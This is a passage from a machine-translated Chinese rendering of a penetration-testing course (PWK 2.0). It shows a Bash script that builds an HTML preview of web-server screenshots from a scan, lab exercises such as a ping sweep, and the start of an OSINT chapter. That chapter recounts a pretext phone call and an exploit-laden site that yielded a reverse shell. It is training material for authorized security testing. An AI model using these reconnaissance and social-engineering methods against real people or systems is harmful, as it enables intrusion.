<div style="position:absolute;top:156071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由我们的 Bash one-liner 使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">ls</font></font></b><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">创建</font><font style="vertical-align: inherit;">，它每行列出一个文件，抑制</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:156091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外细节：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 *.png</font></font></font></b></nobr></div>
<div style="position:absolute;top:156142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10.png</font></font></nobr></div>
<div style="position:absolute;top:156159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.115.png</font></font></nobr></div>
<div style="position:absolute;top:156176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.116.png</font></font></nobr></div>
<div style="position:absolute;top:156193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.128.png</font></font></nobr></div>
<div style="position:absolute;top:156210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.13.png</font></font></nobr></div>
<div style="position:absolute;top:156227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.133.png</font></font></nobr></div>
<div style="position:absolute;top:156244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.14.png</font></font></nobr></div>
<div style="position:absolute;top:156261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.202.png</font></font></nobr></div>
<div style="position:absolute;top:156278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.209.png</font></font></nobr></div>
<div style="position:absolute;top:156295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.217.png</font></font></nobr></div>
<div style="position:absolute;top:156312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:156331;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 191 - 探索我们的 Bash one-liner 的结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰出的。</font><font style="vertical-align: inherit;">我们离我们的目标越来越近了。</font><font style="vertical-align: inherit;">我们可以单独检查这些文件，但是</font></font></nobr></div>
<div style="position:absolute;top:156380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更有吸引力的选择是再次将我们的脚本知识付诸实践，看看是否有</font></font></nobr></div>
<div style="position:absolute;top:156399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何我们可以自动化的东西。</font><font style="vertical-align: inherit;">这不仅需要 Bash 脚本技能，还需要基本的</font></font></nobr></div>
<div style="position:absolute;top:156419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">134</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知识：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./pngtohtml.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:156471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:156488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Bash 脚本通过 HTML 检查扫描结果。</font></font></nobr></div>
<div style="position:absolute;top:156522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "&lt;HTML&gt;&lt;BODY&gt;&lt;BR&gt;" &gt; web.html</font></font></nobr></div>
<div style="position:absolute;top:156555;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 *.png | </font><font style="vertical-align: inherit;">awk -F : '{ print $1":\n&lt;BR&gt;&lt;IMG SRC=\""$1""$2"\" width=600&gt;&lt;BR&gt;"}' &gt;&gt; w</font></font></nobr></div>
<div style="position:absolute;top:156572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eb.html</font></font></nobr></div>
<div style="position:absolute;top:156607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "&lt;/BODY&gt;&lt;/HTML&gt;" &gt;&gt; web.html</font></font></nobr></div>
<div style="position:absolute;top:156640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./pngtohtml.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:156674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./pngtohtml.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:156708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/temp$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">firefox web.html</font></font></font></b></nobr></div>
<div style="position:absolute;top:156728;left:243"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 192 - 创建一个页面来查看我们扫描结果中的所有图像</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:156757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此脚本构建一个 HTML 文件 ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">web.html</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，从最基本的标签开始。</font><font style="vertical-align: inherit;">然后，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">awk</font></font></font></b></nobr></div>
<div style="position:absolute;top:156776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句将每个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.PNG</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件名插入到 HTML </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IMG</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标签中，并将其附加到我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">web.html</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件中。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:156863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">134 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（MDN 网络文档，2019 年），https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Getting_started</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:156991;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="133"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 133 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:157024;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:158101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:158101;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:158101;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">133</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们将 HTML 结束标记附加到文件中，使脚本可执行，并在我们的</font></font></nobr></div>
<div style="position:absolute;top:157139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器。</font><font style="vertical-align: inherit;">结果很简单，但很有效，它为我们提供了每个 Web 服务器主页的视图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:157473;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 18：预览扫描结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">希望这些简短的实际示例能让您了解一些可能性</font></font></nobr></div>
<div style="position:absolute;top:157524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash 脚本必须提供。</font><font style="vertical-align: inherit;">在尝试使用 Bash 时，学习有效地使用 Bash 至关重要</font></font></nobr></div>
<div style="position:absolute;top:157543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在评估期间快速自动化大量任务。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:157577;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 研究 Bash 循环并编写一个简短的脚本来执行目标 IP 范围的 ping 扫描</font></font></nobr></div>
<div style="position:absolute;top:157627;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.0/24。</font></font></nobr></div>
<div style="position:absolute;top:157655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 尝试用更高级的脚本语言如Python、Perl或</font></font></nobr></div>
<div style="position:absolute;top:157675;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">红宝石。</font></font></nobr></div>
<div style="position:absolute;top:157703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用本模块中的实际示例来帮助您创建一个 Bash 脚本，提取</font></font></nobr></div>
<div style="position:absolute;top:157722;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">access_log.txt 文件中的 JavaScript 文件 (http://www.offensive-security.com/pwk-</font></font></nobr></div>
<div style="position:absolute;top:157741;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件/access_log.txt.gz）。</font><font style="vertical-align: inherit;">确保文件名不包含路径，是唯一的，并且</font></font></nobr></div>
<div style="position:absolute;top:157761;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">排序。</font></font></nobr></div>
<div style="position:absolute;top:157789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 用另一种语言（如 Python、Perl 或 Ruby）重写前面的练习。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:157826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.8 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:157868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GNU Bourne-Again Shell (Bash) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个强大的工作环境和脚本引擎。</font><font style="vertical-align: inherit;">一种</font></font></nobr></div>
<div style="position:absolute;top:157887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">称职的安全专家巧妙地利用 Bash 脚本来简化和自动化</font></font></nobr></div>
<div style="position:absolute;top:157907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多 Linux 任务和程序。</font><font style="vertical-align: inherit;">在本模块中，我们介绍了 Bash 脚本并探索了</font></font></nobr></div>
<div style="position:absolute;top:157926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几个实际场景。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:158051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（GNU，2017），http://www.gnu.org/software/bash/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:158179;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="134"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 134 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:158212;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:159289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:159289;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:159289;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">134</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:158302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.8.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:158328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6. 被动信息收集</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:158372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被动信息收集（也称为开源情报或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OSINT </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">136</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）是一个过程</font></font></nobr></div>
<div style="position:absolute;top:158392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集关于目标的公开可用信息，通常没有任何直接交互</font></font></nobr></div>
<div style="position:absolute;top:158411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了那个目标。</font></font></nobr></div>
<div style="position:absolute;top:158444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用多种资源和工具来收集这些信息，过程是</font></font></nobr></div>
<div style="position:absolute;top:158463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">周期性而不是线性。</font><font style="vertical-align: inherit;">换句话说，该过程任何阶段的“下一步”取决于</font></font></nobr></div>
<div style="position:absolute;top:158482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在前面的步骤中发现的，创建过程的“循环”。</font><font style="vertical-align: inherit;">由于每个工具或资源</font></font></nobr></div>
<div style="position:absolute;top:158502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以产生任意数量的不同结果，很难定义一个标准化的过程。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:158521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被动信息收集的最终目标是获得澄清或扩展信息</font></font></nobr></div>
<div style="position:absolute;top:158541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击面，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">137</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助我们进行成功的网络钓鱼活动，或补充其他</font></font></nobr></div>
<div style="position:absolute;top:158560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试步骤，例如密码猜测。</font></font></nobr></div>
<div style="position:absolute;top:158593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于此过程的循环性质，此模块的展开方式将与之前的模块不同。</font></font></nobr></div>
<div style="position:absolute;top:158612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将简单地展示各种资源和工具，而不是呈现链接的场景，解释</font></font></nobr></div>
<div style="position:absolute;top:158631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们是如何工作的，并为您提供构建被动信息所需的基本技术-</font></font></nobr></div>
<div style="position:absolute;top:158651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集会运动。</font></font></nobr></div>
<div style="position:absolute;top:158684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在开始之前，我们需要定义被动信息收集。</font><font style="vertical-align: inherit;">有两个不同的学校</font></font></nobr></div>
<div style="position:absolute;top:158703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于在这种情况下什么构成“被动”的想法。</font></font></nobr></div>
<div style="position:absolute;top:158736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在最严格的解释中，我们</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从不</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接与目标沟通。</font><font style="vertical-align: inherit;">例如，我们可以</font></font></nobr></div>
<div style="position:absolute;top:158755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">依赖第三方获取信息，但我们不会访问目标的任何系统或服务器。</font></font></nobr></div>
<div style="position:absolute;top:158788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这种方法可以对我们的行为和意图保持高度保密，但可以</font></font></nobr></div>
<div style="position:absolute;top:158807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也很麻烦，可能会限制我们的结果。</font></font></nobr></div>
<div style="position:absolute;top:158840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在更宽松的解释中，我们可能会与目标进行交互，但只能像普通 Internet 用户那样进行。</font></font></nobr></div>
<div style="position:absolute;top:158859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，如果目标的网站允许我们注册一个帐户，我们就可以这样做。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:158879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此阶段，我们不会测试网站的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:158912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将采用后者，对我们的方法进行较不严格的解释。</font></font></nobr></div>
<div style="position:absolute;top:158944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两种方法都不一定“正确”。</font><font style="vertical-align: inherit;">我们需要考虑参与的范围和规则</font></font></nobr></div>
<div style="position:absolute;top:158964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在决定使用哪个之前进行渗透测试。</font><font style="vertical-align: inherit;">此外，请记住，此阶段可能不会</font></font></nobr></div>
<div style="position:absolute;top:158983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">始终是必要的，即使这个阶段取得成果（比如以成功的形式）</font></font></nobr></div>
<div style="position:absolute;top:159003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鱼叉式网络钓鱼活动），其他阶段可能需要同等或更多的关注。</font></font></nobr></div>
<div style="position:absolute;top:159035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们开始讨论资源和工具之前，让我们分享一个渗透的个人例子</font></font></nobr></div>
<div style="position:absolute;top:159055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试涉及被动信息收集活动的成功要素。</font></font></nobr></div>
<div style="position:absolute;top:159088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者的笔记</font></font></nobr></div>
<div style="position:absolute;top:159120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几年前，我们进攻安全部门的任务是为</font></font></nobr></div>
<div style="position:absolute;top:159140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小公司。</font><font style="vertical-align: inherit;">这家公司几乎没有互联网存在，也很少对外暴露</font></font></nobr></div>
<div style="position:absolute;top:159159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务，所有这些都被证明是安全的。</font><font style="vertical-align: inherit;">几乎没有攻击面可言。</font><font style="vertical-align: inherit;">后</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:159219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">136 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Open-source_intelligence</font></font></font></nobr></div>
<div style="position:absolute;top:159239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">137 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年）https://en.wikipedia.org/wiki/Attack_surface</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:159367;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="135"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 135 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:159400;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:160477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:160477;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:160477;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用各种 Google 搜索的集中被动信息收集活动</font></font></nobr></div>
<div style="position:absolute;top:159515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作员，将一些“管道”到其他在线工具的信息连接起来，以及一些创造性和</font></font></nobr></div>
<div style="position:absolute;top:159534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">合乎逻辑，我们在集邮区发现了目标员工的一个论坛帖子</font></font></nobr></div>
<div style="position:absolute;top:159554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论坛：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你好！</font></font></nobr></div>
<div style="position:absolute;top:159606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我正在寻找 1950 年代的稀有邮票 - 出售或交易。</font></font></nobr></div>
<div style="position:absolute;top:159623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请通过 david@company-address.com 与我联系</font></font></nobr></div>
<div style="position:absolute;top:159640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手机：999-999-9999</font></font></nobr></div>
<div style="position:absolute;top:159659;left:385"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 193 - 一个论坛帖子</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用这些信息发起了一次半复杂的客户端攻击。</font><font style="vertical-align: inherit;">我们很快注册了一个</font></font></nobr></div>
<div style="position:absolute;top:159707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮票相关域名，并设计了一个登陆页面，展示了各种稀有邮票</font></font></nobr></div>
<div style="position:absolute;top:159727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1950 年代，我们使用 Google 图片找到的。</font><font style="vertical-align: inherit;">网站的域名和设计</font></font></nobr></div>
<div style="position:absolute;top:159746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无疑提高了我们邮票交易网站的可信度。</font></font></nobr></div>
<div style="position:absolute;top:159779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们在网站的网页中嵌入了一些讨厌的客户端攻击利用代码，并调用</font></font></nobr></div>
<div style="position:absolute;top:159799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作日的“大卫”。</font><font style="vertical-align: inherit;">在通话中，我们假扮成一个继承了他们的集邮者</font></font></nobr></div>
<div style="position:absolute;top:159818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">祖父的大量邮票收藏。</font></font></nobr></div>
<div style="position:absolute;top:159851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">David 接到我们的电话非常高兴，并访问了恶意网站以查看“邮票</font></font></nobr></div>
<div style="position:absolute;top:159870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收藏”毫不犹豫。</font><font style="vertical-align: inherit;">在浏览网站时，漏洞利用代码在他的本地执行</font></font></nobr></div>
<div style="position:absolute;top:159889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器并给我们发送了一个反向外壳。</font></font></nobr></div>
<div style="position:absolute;top:159922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一个很好的例子，说明了一些无害的被动收集信息，例如</font></font></nobr></div>
<div style="position:absolute;top:159941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用公司电子邮件处理个人事务的员工可能会在</font></font></nobr></div>
<div style="position:absolute;top:159961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试。</font><font style="vertical-align: inherit;">有时，最小的细节可能是最重要的。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:160023;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然“大卫”没有遵循最佳实践，但这是公司的政策和</font></font></i></nobr></div>
<div style="position:absolute;top:160042;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缺乏安全意识计划来为这次违规奠定基础。</font><font style="vertical-align: inherit;">因为</font></font></i></nobr></div>
<div style="position:absolute;top:160062;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对此，我们避免在书面报告中将责任归咎于个人。</font><font style="vertical-align: inherit;">我们的目标作为</font></font></i></nobr></div>
<div style="position:absolute;top:160081;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试人员是为了提高我们客户资源的安全性，而不是为了</font></font></i></nobr></div>
